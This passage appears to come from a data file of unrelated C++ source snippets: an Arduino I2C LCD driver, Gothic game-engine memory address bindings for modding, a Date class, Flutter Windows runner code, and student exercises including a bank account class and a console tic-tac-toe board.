LiquidCrystal_I2C::cursor() {\r\n\t_displaycontrol |= LCD_CURSORON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// Turn on and off the blinking cursor\r\nvoid LiquidCrystal_I2C::noBlink() {\r\n\t_displaycontrol &= ~LCD_BLINKON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\nvoid LiquidCrystal_I2C::blink() {\r\n\t_displaycontrol |= LCD_BLINKON;\r\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\r\n}\r\n\r\n// These commands scroll the display without changing the RAM\r\nvoid LiquidCrystal_I2C::scrollDisplayLeft(void) {\r\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVELEFT);\r\n}\r\nvoid LiquidCrystal_I2C::scrollDisplayRight(void) {\r\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVERIGHT);\r\n}\r\n\r\n// This is for text that flows Left to Right\r\nvoid LiquidCrystal_I2C::leftToRight(void",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_II_Classic {\n  \n#ifdef __OAI_HUMAN_H__VER2__\n  zSTRING& oCAIHuman::Cam_Normal = *(zSTRING*)0x0097E3C8;\n  zSTRING& oCAIHuman::Cam_Run    = *(zSTRING*)0x0097E330;\n  zSTRING& oCAIHuman::Cam_Fight  = *(zSTRING*)0x0097E3B4;\n#endif // __OAI_HUMAN_H__VER2__\n\n#ifdef __OCOLLISION_OBJECT_MISC_CHAR_H__VER2__\n  zCCollisionObjectDef& oCCollObjectCharacter::s_oCollObjClass = *(zCCollisionObjectDef*)0x00A824D0;\n#endif // __OCOLLISION_OBJECT_MISC_CHAR_H__VER2__\n\n#ifdef __ODOC_H__VER2__\n  zCView*& oCDoc::posView = *(zCView**)0x0098112C;\n#endif // __ODOC_H__VER2__\n\n#ifdef __OFOCUS_H__VER2__\n  oCNpcFocus*& oCNpcFocus::focus             = *(oCNpcFocus**)0x00981290;\n  oCNpcFocus** oCNpcFocus::focuslist         = (oCNpcFocus**)0x00981250;\n  int& oCNpcFocus::s_iHightlightMeleeFocus   = *(int*)0x00981294;\n  int& oCNpcFocus::s_bHighlightInteractFocus = *(int*)0x0089E450;\n  oCVisualFX*& oCNpcFocus::highLightFX       = *(oCVisualFX**)0x00981298;\n  int& oCNpcFocus::isHighLighted             = *(int*)0x0098129C;\n#endif // __OFOCUS_H__VER2__\n\n#ifdef __OGAME_H__VER2__\n  int& oCGame::s_bUseOldControls    = *(int*)0x0089E520;\n  float& oCGame::s_fUseSpeechReverb = *(float*)0x0089E524;\n  int& oCGame::s_bUseOnlineHelp     = *(int*)0x0089E528;\n  int& oCGame::s_bUsePotionKeys     = *(int*)0x0089E52C;\n  int& oCGame::s_bUseQuickSave      = *(int*)0x0089E530;\n#endif // __OGAME_H__VER2__\n\n#ifdef __OINFO_H__VER2__\n  int& oCInfoManager::size_checked = *(int*)0x009819B0;\n#endif // __OINFO_H__VER2__\n\n#ifdef __OINVENTORY_H__VER2__\n  zCList<oCItemContainer>& oCItemContainer::contList = *(zCList<oCItemContainer>*)0x00981B40;\n  int& oCItemContainer::gfx_loaded                   = *(int*)0x00981C3C;\n  zCGfx*& oCItemContainer::gfx_cat                   = *(zCGfx**)0x00981C40;\n  zCGfx*& oCItemContainer::gfx_equip                 = *(zCGfx**)0x00981C44;\n  zCGfx*& oCItemContainer::gfx_cursor                = *(zCGfx**)0x00981C48;\n  zCGfx*& oCItemContainer::gfx_cursor_equip          = *(zCGfx**)0x00981C4C;\n  zCGfx** oCItemContainer::gfx_arrow                 = (zCGfx**)0x00981C50;\n  zCGfx*& oCNpcInventory::gfx_title                  = *(zCGfx**)0x00981C70;\n#endif // __OINVENTORY_H__VER2__\n\n#ifdef __OITEM_H__VER2__\n  float& oCItem::s_fGlobalItemZBiasScale = *(float*)0x00981D3C;\n#endif // __OITEM_H__VER2__\n\n#ifdef __OITEM_REACT_H__VER2__\n  int& oCTradeManager::size_checked = *(int*)0x00981E24;\n#endif // __OITEM_REACT_H__VER2__\n\n#ifdef __OMUSIC_ZONE_H__VER2__\n  long& oCZoneMusic::s_lastzonechange       = *(long*)0x009862F4;\n  int& oCZoneMusic::s_zonetime              = *(int*)0x008A8EE0;\n  int& oCZoneMusic::s_daytime               = *(int*)0x008A8EE4;\n  oHEROSTATUS& oCZoneMusic::s_herostatus    = *(oHEROSTATUS*)0x009862F8;\n  oCZoneMusic*& oCZoneMusic::s_musiczone    = *(oCZoneMusic**)0x009862FC;\n  oCZoneMusic*& oCZoneMusic::s_oldmusiczone = *(oCZoneMusic**)0x00986300;\n#endif // __OMUSIC_ZONE_H__VER2__\n\n#ifdef __ONEWS_H__VER2__\n  int& oCNews::news_counter = *(int*)0x009826DC;\n#endif // __ONEWS_H__VER2__\n\n#ifdef __ONPC_H__VER2__\n  zSTRING*& oCNpc::FightAIInstances        = *(zSTRING**)0x00A81D40;\n  oCNpc::oEBloodMode& oCNpc::modeBlood     = *(oCNpc::oEBloodMode*)0x008ADDF8;\n  int& oCNpc::isEnabledDamageDebug         = *(int*)0x00A81CB8;\n  oCStealContainer*& oCNpc::stealcontainer = *(oCStealContainer**)0x0098332C;\n  int& oCNpc::s_bEnabledDialogCamStop      = *(int*)0x009831E0;\n  int& oCNpc::s_bTargetLocked              = *(int*)0x009831D8;\n  zMAT4& oCNpc::s_playerPositionMatrix     = *(zMAT4*)0x00983228;\n  oCNpc*& oCNpc::player                    = *(oCNpc**)0x009831DC;\n  int& oCNpc::godmode                      = *(int*)0x009831B8;\n  int& oCNpc::angle_near                   = *(int*)0x008A42F8;\n  int& oCNpc::angle_far_up                 = *(int*)0x008A42FC;\n  int& oCNpc::angle_far_side               = *(int*)0x008A4300;\n  int& oCNpc::game_mode                    = *(int*)0x00983320;\n  oCNpc*& oCNpc::dontArchiveThisNpc        = *(oCNpc**)0x009831E4;\n  int*& oCNpc::bodyStateList               = *(int**)0x00982B38;\n  int& oCNpc::ai_disabled                  = *(int*)0x009831BC;\n  float& oCNpc::ai_messagesSkip            = *(float*)0x009831C0;\n  float& oCNpc::ai_messagesSkipTimer       = *(float*)0x009831C4;\n  float& oCNpc::ai_scriptStateSkip         = *(float*)0x009831C8;\n  float& oCNpc::ai_scriptStateSkipTimer    = *(float*)0x009831CC;\n  int& oCNpc::ai_baseEnabled               = *(int*)0x008A42E8;\n  int& oCNpc::isEnabledTalkBox             = *(int*)0x008A42EC;\n  int& oCNpc::isEnabledTalkBoxPlayer       = *(int*)0x008A42F0;\n  int& oCNpc::isEnabledTalkBoxAmbient      = *(int*)0x009831D0;\n  int& oCNpc::isEnabledTalkBoxNoise        = *(int*)0x009831D4;\n#endif // __ONPC_H__VER2__\n\n#ifdef __OTEXT_H__VER2__\n  zCView*& oCText::output           = *(zCView**)0x00983E90;\n  int& oCText::TXT_GUILD            = *(int*)0x00983E94;\n  int& oCText::TXT_ATTRIBUTE        = *(int*)0x00983E98;\n  int& oCText::TXT_FIGHT_TALENT     = *(int*)0x00983E9C;\n",
    "#include \"UnionAfx.h\"\n\nnamespace Gothic_I_Addon {\n#ifdef __OCS_MANAGER_H__VER1__\n  zCClassDef* oCCSManager::classDef                 = (zCClassDef*)0x008A2490;\n#endif\n#ifdef __OCS_PLAYER_H__VER1__\n  zCClassDef* oCCSPlayer::classDef                  = (zCClassDef*)0x008A2750;\n#endif\n#ifdef __OCS_PROPS_H__VER1__\n  zCClassDef* oCCSProps::classDef                   = (zCClassDef*)0x008A2810;\n#endif\n#ifdef __OCS_TRIGGER_H__VER1__\n  zCClassDef* oCCSTrigger::classDef                 = (zCClassDef*)0x008A2888;\n#endif\n#ifdef __ZCCS_CONTEXT_H__VER1__\n  zCClassDef* zCCSCutsceneContext::classDef         = (zCClassDef*)0x008A2900;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCEvMsgCutscene::classDef             = (zCClassDef*)0x008A2970;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCSBlock::classDef                   = (zCClassDef*)0x008A29E8;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCSSyncBlock::classDef               = (zCClassDef*)0x008A2A58;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCSAtomicBlock::classDef             = (zCClassDef*)0x008A2AC8;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCutscene::classDef                  = (zCClassDef*)0x008A2B38;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCSBlockBase::classDef               = (zCClassDef*)0x008A2C08;\n#endif\n#ifdef __ZCCS_CUTSCENE_H__VER1__\n  zCClassDef* zCCSRole::classDef                    = (zCClassDef*)0x008A2C78;\n#endif\n#ifdef __ZCCS_LIB_H__VER1__\n  zCClassDef* zCCSLib::classDef                     = (zCClassDef*)0x008A2CF0;\n#endif\n#ifdef __ZCCS_MANAGER_H__VER1__\n  zCClassDef* zCCSManager::classDef                 = (zCClassDef*)0x008A2D78;\n#endif\n#ifdef __ZCCS_PLAYER_H__VER1__\n  zCClassDef* zCCSPlayer::classDef                  = (zCClassDef*)0x008A2DF8;\n#endif\n#ifdef __ZCCS_POOL_H__VER1__\n  zCClassDef* zCCSPoolItem::classDef                = (zCClassDef*)0x008A2E70;\n#endif\n#ifdef __ZCCS_PROPS_H__VER1__\n  zCClassDef* zCCSProps::classDef                   = (zCClassDef*)0x008A2EE8;\n#endif\n#ifdef __OSAVEGAME_H__VER1__\n  zCClassDef* oCSavegameInfo::classDef              = (zCClassDef*)0x008A36D0;\n#endif\n#ifdef __OTRIGGER_H__VER1__\n  zCClassDef* oCTriggerScript::classDef             = (zCClassDef*)0x008A37E8;\n#endif\n#ifdef __OTRIGGER_H__VER1__\n  zCClassDef* oCTriggerChangeLevel::classDef        = (zCClassDef*)0x008A3928;\n#endif\n#ifdef __ZNET_EVENT_MAN_H__VER1__\n  zCClassDef* zCNetEventManager::classDef           = (zCClassDef*)0x008ADB28;\n#endif\n#ifdef __ZNET_MANAGER_H__VER1__\n  zCClassDef* zCNetManager::classDef                = (zCClassDef*)0x008ADC28;\n#endif\n#ifdef __ZNET_VOB_CONTROL_H__VER1__\n  zCClassDef* zCNetVobControl::classDef             = (zCClassDef*)0x008ADD60;\n#endif\n#ifdef __OSPELL_H__VER1__\n  zCClassDef* oCSpell::classDef                     = (zCClassDef*)0x008AF290;\n#endif\n#ifdef __OVIS_FX_H__VER1__\n  zCClassDef* oCVisualFX::classDef                  = (zCClassDef*)0x008AF438;\n#endif\n#ifdef __OVIS_FX__MULTI_TARGET_H__VER1__\n  zCClassDef* oCVisFX_MultiTarget::classDef         = (zCClassDef*)0x008AF838;\n#endif\n#ifdef __ZAI_CAMERA_H__VER1__\n  zCClassDef* zCAICamera::classDef                  = (zCClassDef*)0x008AF998;\n#endif\n#ifdef __ZCS_CAMERA_H__VER1__\n  zCClassDef* zCCSCamera_EventMsg::classDef         = (zCClassDef*)0x008B2010;\n#endif\n#ifdef __ZCS_CAMERA_H__VER1__\n  zCClassDef* zCCSCamera::classDef                  = (zCClassDef*)0x008B2098;\n#endif\n#ifdef __ZCS_CAMERA_H__VER1__\n  zCClassDef* zCCamTrj_KeyFrame::classDef           = (zCClassDef*)0x008B2108;\n#endif\n#ifdef __ZCS_CAMERA_H__VER1__\n  zCClassDef* zCCSCamera_EventMsgActivate::classDef = (zCClassDef*)0x008B2178;\n#endif\n#ifdef __ZAI_H__VER1__\n  zCClassDef* zCAIBase::classDef                    = (zCClassDef*)0x008B52A8;\n#endif\n#ifdef __ZAI_H__VER1__\n  zCClassDef* zCAIBaseSound::classDef               = (zCClassDef*)0x008B5318;\n#endif\n#ifdef __ZAI_PLAYER_H__VER1__\n  zCClassDef* zCAIPlayer::classDef                  = (zCClassDef*)0x008B5420;\n#endif\n#ifdef __ZARCHIVER_H__VER1__\n  zCClassDef* zCArchiver::classDef                  = (zCClassDef*)0x008B5548;\n#endif\n#ifdef __ZARCHIVER2_H__VER1__\n  zCClassDef* zCArchiverBinSafe::classDef           = (zCClassDef*)0x008B56B0;\n#endif\n#ifdef __ZARCHIVER_GENERIC_H__VER1__\n  zCClassDef* zCArchiverGeneric::classDef           = (zCClassDef*)0x008B57B0;\n#endif\n#ifdef __ZVISUAL_H__VER1__\n  zCClassDef* zCDecal::classDef                     = (zCClassDef*)0x008B9438;\n#endif\n#ifdef __ZLENSFLARE_H__VER1__\n  zCClassDef* zCLensFlareFX::classDef               = (zCClassDef*)0x008B9510;\n#endif\n#ifdef __ZMATERIAL_H__VER1__\n  zCClassDef* zCMaterial::classDef                  = (zCClassDef*)0x008B9608;\n#endif\n#ifdef __ZVISUAL_H__VER1__\n  zCClassDef* zCMesh::classDef                      = (zCClassDef*)0x008B96B8;\n#endif\n#ifdef __ZMODEL_H__VER1__\n  zCClassDef* zCModelAni::classDef                  = (zCClassDef*)0x008B9780;\n#endif\n#ifdef __ZMODEL_H__VER1__\n  zCClassDef* zCModel::classDef     ",
    "#define _CRT_SECURE_NO_WARNINGS\r\n#include \"Date.h\"\r\n\r\nDate::Date(int year, int month, int day)\r\n{\r\n\t_year = year;\r\n\t_month = month;\r\n\t_day = day;\r\n}\r\nDate::Date(const Date& d)\r\n{\r\n\t_year = d._year;\r\n\t_month = d._month;\r\n\t_day = d._day;\r\n}\r\nbool Date::operator==(const Date& d)\r\n{\r\n\treturn _year == d._year &&\r\n\t\t_month == d._month &&\r\n\t\t_day == d._day;\r\n}\r\nvoid Date::print() const\r\n\t{\r\n\t\tcout << _year << \"-\" << _month << \"-\" << _day<<endl;\r\n\t}\r\nDate Date:: operator++(int n)\r\n{\r\n\tDate temp(*this);\r\n\t*this += 1;\r\n\treturn temp;\r\n}\r\nDate& Date::operator+=(int n)\r\n{\r\n\tthis->_day += n;\r\n\twhile (this->_day > GetMonthDay(this->_year, this->_month))\r\n\t{\r\n\t\tthis->_day -= GetMonthDay(this->_year, this->_month);\r\n\t\tthis->_month++;\r\n\t\tif (this->_month == 13)\r\n\t\t{\r\n\t\t\tthis->_year++;\r\n\t\t\tthis->_month = 1;\r\n\t\t}\r\n\t}\r\n\treturn *this;\r\n}\r\nbool Date::operator!= (Date& d)\r\n{\r\n\treturn !(*this == d);\r\n}\r\nint Date::GetMonthDay(int year, int month)\r\n{\r\n\tstatic int MonthDay[13] = { 0,31,28,31,30,31,30,31,31,30,31,30,31 };\r\n\tif (year >= 0 && ((year % 4 == 0 && year % 100 != 0) || year % 400 == 0) && month == 2)\r\n\t{\r\n\t\treturn 29;\r\n\t}\r\n\treturn MonthDay[month];\r\n}\r\nbool Date::operator<(const Date& d)\r\n{\r\n\tif (_year < d._year)\r\n\t\treturn true;\r\n\telse\r\n\t\tif (_year == d._year && _month < d._month)\r\n\t\t\treturn true;\r\n\t\telse\r\n\t\t\tif (_year == d._year && _month == d._month && _day < d._day)\r\n\t\t\t\treturn true;\r\n\r\n\treturn false;\r\n}\r\nint  Date::operator-(Date& d)\r\n{\r\n\tDate max = *this;\r\n\tDate min = d;\r\n\tint flag = 1;\r\n\tif (*this < d)\r\n\t{\r\n\t\tmax = d;\r\n\t\tmin = *this;\r\n\t\tflag = -1;\r\n\t}\r\n\tint n = 0;\r\n\twhile (max!=min)\r\n\t{\r\n\t\tmin++;\r\n\t\tn++;\r\n\t}\r\n\treturn n*flag;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <ctime>\n\nusing namespace std;\n\nclass BankAccount {\nprivate:\n    struct Date {\n        int day;\n        int month;\n        int year;\n    };\n\n    struct Transaction {\n        Date date;\n        string type;\n        double amount;\n    };\n\n    Date creationDate;\n    double balance;\n    string ownerFirstName;\n    string ownerLastName;\n    Transaction lastTransaction;\n\npublic:\n    BankAccount(const string& firstName, const string& lastName) {\n        // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0434\u0430\u0442\u0443 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u0447\u0435\u0442\u0430 \u043d\u0430 \u0442\u0435\u043a\u0443\u0449\u0443\u044e \u0434\u0430\u0442\u0443\n        time_t t = time(NULL);\n        tm* localTime = localtime(&t);\n        creationDate.day = localTime->tm_mday;\n        creationDate.month = localTime->tm_mon + 1;\n        creationDate.year = localTime->tm_year + 1900;\n\n        balance = 0.0;\n        ownerFirstName = firstName;\n        ownerLastName = lastName;\n    }\n\n    void deposit(double amount) {\n        if (amount > 0.0) {\n            balance += amount;\n            lastTransaction = {getCurrentDate(), \"Deposit\", amount};\n            cout << \"Deposit of \" << amount << \" is successful.\\n\";\n        } else {\n            cout << \"Invalid amount.\\n\";\n        }\n    }\n\n    void withdraw(double amount) {\n        if (amount > 0.0 && amount <= balance) {\n            balance -= amount;\n            lastTransaction = {getCurrentDate(), \"Withdrawal\", amount};\n            cout << \"Withdrawal of \" << amount << \" is successful.\\n\";\n        } else {\n            cout << \"Invalid: \" << amount<<\"\\n\";\n        }\n    }\n\n    void printLastTransaction() const {\n        cout << \"Last Transaction: \"\n                  << lastTransaction.date.day << \"/\"\n                  << lastTransaction.date.month << \"/\"\n                  << lastTransaction.date.year << \"\\n\"\n                  << \"Type: \" << lastTransaction.type << \"\\n\"\n                  << \"Amount: $\" << lastTransaction.amount << \"\\n\";\n    }\n\n    void printBalance() const {\n        cout << \"Available Balance: \" << balance << \"\\n\";\n    }\n\nprivate:\n    Date getCurrentDate() const {\n        time_t t = time(NULL);\n        tm* localTime = localtime(&t);\n        Date currentDate;\n        currentDate.day = localTime->tm_mday;\n        currentDate.month = localTime->tm_mon + 1;\n        currentDate.year = localTime->tm_year + 1900;\n        return currentDate;\n    }\n};\n\nint main() {\n    BankAccount account(\"Khaibullin\",\"Denis\");\n\n    account.deposit(1000.0);\n    account.withdraw(500.0);\n    account.withdraw(600.0);\n    account.printLastTransaction();\n    account.printBalance();\n\n    return 0;\n}",
    "// Jakub Dutkiewicz EiT gr.2 188833\n// Visual Studio 2019\n\n#include <iostream>\n#include <string>\n#include <thread>\n#include <chrono>\n#include <ctime>\n\nusing namespace std;\n\nvoid Menu_gry();\n\nvoid Rysowanie(char T[9][9]) // funkcja rysujaca tablice\n{\n\n\n\n\tconst char kraw_poz = 0xCD;\n\tconst char kraw_pion = 0xBA;\n\tconst char lewa_gora_rog = 0xC9;\n\tconst char lewa_dol_rog = 0xC8;\n\tconst char prawa_gora_rog = 0xBB;\n\tconst char prawa_dol_rog = 0xBC;\n\tconst char litera_t = 0xCB;\n\tconst char odwroc_t = 0xCA;\n\tconst char lewe_t = 0xCC;\n\tconst char prawe_t = 0xB9;\n\tconst char krzyz = 0xCE;\n\tconst char spacja = 0xFF;\n\tchar znak1 = 111;\n\tchar znak2 = 120;\n\n\tcout << endl << endl << endl << endl;\n\n\tcout << endl << endl;\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[0][0] << spacja << kraw_pion << spacja << T[0][1] << spacja << kraw_pion << spacja << T[0][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[0][3] << spacja << kraw_pion << spacja << T[0][4] << spacja << kraw_pion << spacja << T[0][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[1][0] << spacja << kraw_pion << spacja << T[1][1] << spacja << kraw_pion << spacja << T[1][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[1][3] << spacja << kraw_pion << spacja << T[1][4] << spacja << kraw_pion << spacja << T[1][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[2][0] << spacja << kraw_pion << spacja << T[2][1] << spacja << kraw_pion << spacja << T[2][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[2][3] << spacja << kraw_pion << spacja << T[2][4] << spacja << kraw_pion << spacja << T[2][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog << \" \" << lewa_dol_rog << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << odwroc_t << kraw_poz << kraw_poz << kraw_poz << prawa_dol_rog;\n\n\tcout << endl << \"                         \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog << \" \" << lewa_gora_rog << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << litera_t << kraw_poz << kraw_poz << kraw_poz << prawa_gora_rog;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[3][0] << spacja << kraw_pion << spacja << T[3][1] << spacja << kraw_pion << spacja << T[3][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[3][3] << spacja << kraw_pion << spacja << T[3][4] << spacja << kraw_pion << spacja << T[3][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"                         \" << kraw_pion << spacja << T[4][0] << spacja << kraw_pion << spacja << T[4][1] << spacja << kraw_pion << spacja << T[4][2] << spacja << kraw_pion << \" \" << kraw_pion << spacja << T[4][3] << spacja << kraw_pion << spacja << T[4][4] << spacja << kraw_pion << spacja << T[4][5] << spacja << kraw_pion;\n\tcout << endl << \"                         \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t << \" \" << lewe_t << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << krzyz << kraw_poz << kraw_poz << kraw_poz << prawe_t;\n\tcout << endl << \"     ",
    "/*\u0412\u0430\u0440\u0438\u0430\u043d\u0442 \u2116 3\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0432\u0430\u0434\u0440\u0430\u0442\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043f\u043e\u043b\u0435, \u0437\u0430\u0434\u0430\u044e\u0449\u0435\u0435 \u0434\u043b\u0438\u043d\u0443 \u0441\u0442\u043e\u0440\u043e\u043d\u044b (\u0441\u0442\u0430\u0442\u0443\u0441 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 protected);\n\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430; \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0435\u0447\u0430\u0442\u0438 \u043f\u043e\u043b\u044f \u0438 \u043f\u043b\u043e\u0449\u0430\u0434\u0438 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0430.\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \u00ab\u043a\u0443\u0431\u00bb. \u042d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043a\u043b\u0430\u0441\u0441\u0430: \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u043e\u043b\u044f;\n\u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043c\u0430 \u043a\u0443\u0431\u0430 (\u0432\u043c\u0435\u0441\u0442\u043e \u043f\u043b\u043e\u0449\u0430\u0434\u0438) (\u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0435\u0440\u0435\u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u043b\u0436\u043d\u0430 \u0432\u044b\u0437\u044b\u0432\u0430\u0442\u044c\u0441\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0438\u0437 